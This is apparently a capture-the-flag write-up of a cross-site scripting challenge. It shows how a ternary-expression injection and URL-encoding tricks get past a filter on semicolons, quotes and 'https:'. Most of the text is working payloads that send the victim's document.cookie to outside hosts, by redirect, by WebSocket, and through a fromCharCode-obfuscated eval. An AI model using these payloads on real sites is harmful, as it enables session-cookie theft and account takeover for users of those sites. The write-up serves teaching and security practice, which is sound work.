### Recon and Initial payload
In this challenge, certain characters and strings were blocked:
```
;
"
https:
http:
```
The payload is inserted within the following JavaScript context:
```js
<script>
var random = Math.random() * (99);
var number = 'payload-here';
.
.
.
</script>
```

Since I couldn't escape the input directly, I used the following payload:
```
test123'?alert(1):'1
```
Which resulting in 
```js
var number = 'test123'?alert(1):'1';
```
This structure allows me to execute JavaScript code conditionally.
### Bypass the filter
I can bypass the `https:` by encoding URL: `https%2b:`
- If I don’t encode the `+` character, it results in `https :`, which is invalid.
- Encoding it makes `+` part of the JavaScript code rather than the URL itself, effectively bypassing the filter. 

Final payload:
```
test123%27?document.location=`https%2b://my-server.com/?c=`.concat(document.cookie):%271
```
### Alternative Payloads
- using **window.location.href** or **window.top.location** or **document.URL.slice(0,7).concat(..**
- websocket
```
'
 new WebSocket('ws://thephilosopher.pro:1234/'.concat(document.cookie))
var test='
```
- toString().constructor
```
'-eval(toString().constructor.fromCharCode(120,61,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,109,121,101,110,100,112,111,105,110,116,46,99,111,109,47,103,101,116,46,112,104,112,63,100,97,116,97,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))//
```